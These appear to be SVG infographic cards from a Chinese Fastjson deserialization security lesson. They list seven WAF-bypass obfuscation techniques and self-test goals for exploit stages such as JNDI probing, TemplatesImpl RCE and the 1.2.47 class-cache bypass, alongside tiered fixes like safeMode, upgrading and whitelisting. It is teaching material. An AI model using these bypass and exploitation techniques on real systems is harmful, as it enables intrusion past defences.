  <rect x="12" y="12" width="776" height="44" rx="8" fill="#b45309" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🎚️ WAF绕过7种变形写法</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">增加多余空格/换行 JSON键值对</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Unicode \u0040 转义 @ 符号</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">URL编码双重编码双写</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Content-Type x-www-form-urlencoded</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">多参数混合注入 JSON</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">请求体分段/压缩</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="godraxezl" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#godraxezl)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7c2d12" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧠 面试高频：Fastjson vs Jackson</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">@type vs @JsonTypeInfo</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">默认自动类型绑定差异</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Fastjson曾维护问题+黑名单不断</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Jackson 生态更稳 社区更活</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">两者都需最新补丁 白名单类型</text>
</svg>

<svg width="800" height="163" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 163">
  <defs><linearGradient id="gvwzrjf7r" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="163" rx="12" fill="url(#gvwzrjf7r)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#166534" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🛠️ 修复方案三级分级</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">临时: WAF拦截 @type + 100+危险类</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">短期: safeMode=true 或升级至1.2.83+</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">长期: 替换为 Jackson/Gson + 显式白名单类型</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g0h4jhs3w" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g0h4jhs3w)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#166534" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">✅ Day40 通关自测CheckList</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">1.2.24 JNDI探测DNSLog成功</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">TemplatesImpl 本地字节码RCE成功</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">1.2.47 Class缓存绕过成功</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">1.2.68 SafeMode 利用失败(正确)</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">WAF绕过变形Payload命中</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">加固后 所有Payload失效</text>
</svg>
